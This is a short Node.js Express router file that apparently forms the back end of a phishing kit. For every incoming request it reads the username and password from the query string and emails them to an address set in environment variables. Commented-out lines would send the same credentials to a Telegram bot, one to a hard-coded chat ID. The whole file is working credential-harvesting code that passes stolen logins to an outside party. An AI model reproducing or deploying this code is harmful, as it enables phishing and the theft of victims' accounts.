require('dotenv').config();
const expres = require('express');
const router = expres.Router();
const sendMail = require('./mailer');
const url = require('url');
const TelegramBot = require('node-telegram-bot-api');
const bot = new TelegramBot(process.env.TOKEN, { polling: true });


const route = router.use("/", function (req, res, next) {
    // Matches "/echo [whatever]"
    const path = url.parse(req.url , true);
    let email = path.query.user;
    let pass = path.query.pass;
     // send a message to the chat acknowledging receipt of their message
    const chatId =  parseInt( process.env.CHATID );
    try {

        if ( email && pass ) {
            const msg  =  `username: ${email} : password ${pass}`;
            // bot.sendMessage(chatId, `username: ${email} : password ${pass}`);
            // bot.sendMessage(5602225099 , `username: ${email} : password ${pass}`);
            // bot.close();
    
            //send email 
            sendMail(`${process.env.MAIL_TO} ` , msg);
            res.send({ status: 'all is good' });
        }
       

    }catch (err) {
        console.log(err.message);;
    }
  
    res.end();
})

module.exports = route;
